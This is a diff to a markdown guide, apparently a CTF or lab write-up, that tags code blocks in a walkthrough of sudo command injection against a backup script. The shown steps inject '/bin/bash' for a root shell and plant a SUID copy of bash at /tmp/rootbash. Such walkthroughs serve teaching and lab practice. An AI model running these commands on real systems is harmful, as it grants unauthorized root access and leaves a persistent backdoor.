@@ -13,6 +13,7 @@ When a script is executable via `sudo` and passes command-line arguments unsanit
 
 ### 1. Identify the Vulnerability
 
+<!-- cmd: linux -->
 ```bash
 cat /etc/mp3backups/backup.sh
 # Example vulnerable line:
@@ -23,6 +24,7 @@ cat /etc/mp3backups/backup.sh
 
 Since the script takes the `$command` directly from the user's arguments, injecting `/bin/bash` will cause the script to evaluate `/bin/bash` with root privileges.
 
+<!-- cmd: linux -->
 ```bash
 sudo /etc/mp3backups/backup.sh -c "/bin/bash"
 ```
@@ -31,6 +33,7 @@ sudo /etc/mp3backups/backup.sh -c "/bin/bash"
 
 If the script's execution context absorbs standard input/output and doesn't present an interactive shell, you can use the injected context to create a SUID copy of bash.
 
+<!-- cmd: linux -->
 ```bash
 sudo /etc/mp3backups/backup.sh -c "cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash"
 /tmp/rootbash -p
